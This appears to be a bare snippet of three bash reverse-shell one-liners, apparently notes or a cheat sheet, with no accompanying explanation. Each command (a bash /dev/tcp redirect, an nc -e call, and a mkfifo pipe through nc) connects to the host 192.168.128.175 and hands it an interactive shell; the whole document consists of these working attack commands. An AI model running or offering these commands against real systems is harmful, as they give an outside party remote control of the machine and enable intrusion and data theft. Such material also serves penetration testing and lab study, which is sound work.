```bash
bash -i >& /dev/tcp/192.168.128.175/4444 0>&1
```

```bash
nc 192.168.128.175 -e /bin/bash
```

```bash
mkfifo /tmp/p
nc 192.168.128.175 4444 < /tmp/p | /bin/bash -i > /tmp/p 2>&1
```
